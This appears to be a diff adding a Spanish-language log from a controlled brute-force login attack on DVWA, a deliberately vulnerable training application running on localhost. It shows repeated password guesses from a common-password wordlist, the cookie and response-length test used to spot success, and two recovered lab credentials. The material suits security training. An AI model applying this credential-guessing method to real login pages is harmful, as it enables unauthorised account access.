@@ -1,0 +1,70 @@
+[*] Inicio de ataque controlado contra DVWA
+[*] URL objetivo: http://127.0.0.1/vulnerabilities/brute/
+[*] Wordlist usuarios: wordlists/usuarios.txt
+[*] Wordlist passwords: wordlists/passwords.txt
+[*] Header clave: Cookie=PHPSESSID + security=low
+[*] Validación de éxito: status 200 + marcador de bienvenida
+
+[TRY] user=root         pass=password     status=200 length=4376
+[TRY] user=root         pass=123456       status=200 length=4376
+[TRY] user=root         pass=12345678     status=200 length=4376
+[TRY] user=root         pass=abc123       status=200 length=4376
+[TRY] user=root         pass=charley      status=200 length=4376
+[TRY] user=root         pass=querty       status=200 length=4376
+[TRY] user=root         pass=monkey       status=200 length=4376
+[TRY] user=root         pass=letmein      status=200 length=4376
+[TRY] user=root         pass=dragon       status=200 length=4376
+[TRY] user=root         pass=111111       status=200 length=4376
+[TRY] user=root         pass=baseball     status=200 length=4376
+[TRY] user=root         pass=iloveyou     status=200 length=4376
+[TRY] user=root         pass=trustno1     status=200 length=4376
+[TRY] user=root         pass=1234567      status=200 length=4376
+[TRY] user=root         pass=sunshine     status=200 length=4376
+[TRY] user=root         pass=master       status=200 length=4376
+[TRY] user=root         pass=123123       status=200 length=4376
+[TRY] user=root         pass=welcome      status=200 length=4376
+[TRY] user=root         pass=shadow       status=200 length=4376
+[TRY] user=root         pass=ashley       status=200 length=4376
+[TRY] user=root         pass=footbal      status=200 length=4376
+[TRY] user=root         pass=jesus        status=200 length=4376
+[TRY] user=root         pass=michael      status=200 length=4376
+[TRY] user=root         pass=ninja        status=200 length=4376
+[TRY] user=root         pass=mustang      status=200 length=4376
+[TRY] user=root         pass=password1    status=200 length=4376
+[TRY] user=admin        pass=password     status=200 length=4414
+[OK] Credencial válida: admin:password
+[TRY] user=admin        pass=123456       status=200 length=4376
+[TRY] user=admin        pass=12345678     status=200 length=4376
+[TRY] user=admin        pass=abc123       status=200 length=4376
+[TRY] user=admin        pass=charley      status=200 length=4376
+[TRY] user=admin        pass=querty       status=200 length=4376
+[TRY] user=admin        pass=monkey       status=200 length=4376
+[TRY] user=admin        pass=letmein      status=200 length=4376
+[TRY] user=admin        pass=dragon       status=200 length=4376
+[TRY] user=admin        pass=111111       status=200 length=4376
+[TRY] user=admin        pass=baseball     status=200 length=4376
+[TRY] user=admin        pass=iloveyou     status=200 length=4376
+[TRY] user=admin        pass=trustno1     status=200 length=4376
+[TRY] user=admin        pass=1234567      status=200 length=4376
+[TRY] user=admin        pass=sunshine     status=200 length=4376
+[TRY] user=admin        pass=master       status=200 length=4376
+[TRY] user=admin        pass=123123       status=200 length=4376
+[TRY] user=admin        pass=welcome      status=200 length=4376
+[TRY] user=admin        pass=shadow       status=200 length=4376
+[TRY] user=admin        pass=ashley       status=200 length=4376
+[TRY] user=admin        pass=footbal      status=200 length=4376
+[TRY] user=admin        pass=jesus        status=200 length=4376
+[TRY] user=admin        pass=michael      status=200 length=4376
+[TRY] user=admin        pass=ninja        status=200 length=4376
+[TRY] user=admin        pass=mustang      status=200 length=4376
+[TRY] user=admin        pass=password1    status=200 length=4376
+[TRY] user=gordonb      pass=password     status=200 length=4376
+[TRY] user=gordonb      pass=123456       status=200 length=4376
+[TRY] user=gordonb      pass=12345678     status=200 length=4376
+[TRY] user=gordonb      pass=abc123       status=200 length=4418
+[OK] Credencial válida: gordonb:abc123
+
+[*] Se alcanzó el límite de credenciales válidas solicitado.
+[*] Resultados:
+    - admin:password (length=4414)
+    - gordonb:abc123 (length=4418)
